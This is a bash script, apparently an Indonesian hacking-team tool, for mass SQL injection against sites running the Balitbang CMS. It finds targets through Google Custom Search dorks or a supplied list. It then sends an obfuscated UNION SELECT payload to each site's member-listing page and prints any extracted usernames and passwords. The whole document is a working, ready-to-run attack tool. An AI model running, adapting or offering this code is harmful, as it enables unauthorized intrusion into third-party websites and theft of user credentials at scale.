#!/bin/bash

#cse_google
#CSE from Teguh aprianto
cse=$(curl -s "https://cse.google.com/cse.js?hpg=1&cx=partner-pub-2698861478625135:3033704849")

#color
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

#banner
cat << EOF

+-----------------------------+
| Mass Exploit SQLi Balitbang |
| Author : ./Lolz	      |
| Team	 : JavaGhost 	      |
+-----------------------------+

EOF

function execute(){
	#execute SQLi balitbang - thanks to Afrizal for dios and post data
	for i in $(cat $1); do
		exe=$(curl -s -X POST ${i} \
			      -d "queryString=exploit%27/**//*!12345uNIoN*//**//*!12345sELEcT*//**/(select+group_concat(%27%3Cresult%3E%27,username,0x3a,password,%27%3C/result%3E%27)+from+user),version()--%20-")
			      if [[ $exe =~ "<result>" ]]; then
				      echo -e "${blue}[${yellow}vuln${blue}]${white} : ${i}"
				      echo -e "${blue}[${yellow}+${blue}] ${yellow}user${white} : "$(echo $exe | grep -o "<result>.*" | cut -d ">" -f2 | cut -d ":" -f1)
				      echo -e "${blue}[${yellow}+${blue}] ${yellow}pass${white} : "$(echo $exe | grep -o "<result>.*" | cut -d ">" -f2 | cut -d ":" -f2 | cut -d "<" -f1)
			      else
				      echo -e "${blue}[${green}not vuln${blue}]${white} : ${i}"
			      fi
	done
}

#ask
echo -e "${blue}[${green}1${blue}] ${yellow}auto dorking\n${blue}[${green}2${blue}] ${yellow}use my list${white}\n"
read -p $'\e[1;34m[\e[1;31m?\e[1;34m]\e[1;37m want to use auto dork or use your own list: \e[1;33m' option
case $option in
	1) #menu 1
		read -p $'\e[1;34m[\e[1;31m?\e[1;34m]\e[1;37m input dork: \e[1;33m' dork
		get=$(curl -s -X GET "https://cse.google.com/cse/element/v1?rsz=filtered_cse&num=1000&hl=en&source=gcsc&gss=.com&cselibv=$(echo "$cse" | sed -n 38p | cut -d '"' -f4)&cx=partner-pub-2698861478625135:3033704849&q=$(echo -ne "$dork" | od -An -tx1 | tr ' ' % | xargs printf "%s")&safe=off&cse_tok=$(echo "$cse" | grep -o "cse_token.*" | cut -d '"' -f3)&exp=csqr,$(echo "$cse" | sed -n 37p | cut -d '"' -f6)&oq=$(echo -ne "$dork" | od -An -tx1 | tr ' ' % | xargs printf "%s")&callback=google.search.cse.api16174" | grep -o "visibleUrl.*")
		echo -e "${blue}[${yellow}*${blue}] ${white}duplicate the target and mix it to get maximum results"
		sleep 0.10 #delete this if you are lazy to wait
		echo "$get" > users ; cat users | awk '{gsub(/",/,"/users/listmemberall.php")}1' | cut -d '"' -f3 > list ; echo "$get" > member ; cat member | awk '{gsub(/",/,"/member/listmemberall.php")}1' | cut -d '"' -f3 >> list
		echo -e "${blue}[${red}+${blue}] ${white}just found: ${yellow}"$(< list wc -l)
		rm users member #delete old list
		execute list
	;;
	2) #menu 2
		read -p $'\e[1;34m[\e[1;31m?\e[1;34m]\e[1;37m input target list: \e[1;33m' list
		if [[ ! -e $list ]]; then\
			echo -e "${red}file not found${white}"
			exit
		fi
		echo -e "${blue}[${red}+${blue}] ${white}Your target: ${yellow}"$(< $list wc -l)
		execute $list
	;;
	*) echo "the choice is not on the menu"
	exit
esac
